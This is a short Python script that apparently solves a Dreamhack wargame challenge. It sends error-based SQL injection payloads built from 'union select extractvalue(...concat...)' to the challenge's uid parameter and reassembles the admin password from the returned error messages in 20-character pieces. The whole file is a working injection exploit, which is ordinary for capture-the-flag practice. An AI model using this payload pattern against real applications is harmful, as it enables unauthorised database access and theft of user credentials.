# -*- coding:utf-8 -*-

import requests

if __name__ == "__main__":
    url = "http://host3.dreamhack.games:9181/?uid="
    ans = ""
    for i in range(1, 60, 20):
        sql = f"' union select extractvalue(1, concat(0x3a, (select substr(upw, {i}, 20) from user where uid='admin'))) -- -"
        res = requests.get(url + sql)

        ans += res.text.split(":")[2].split("'")[0]
    print(ans)
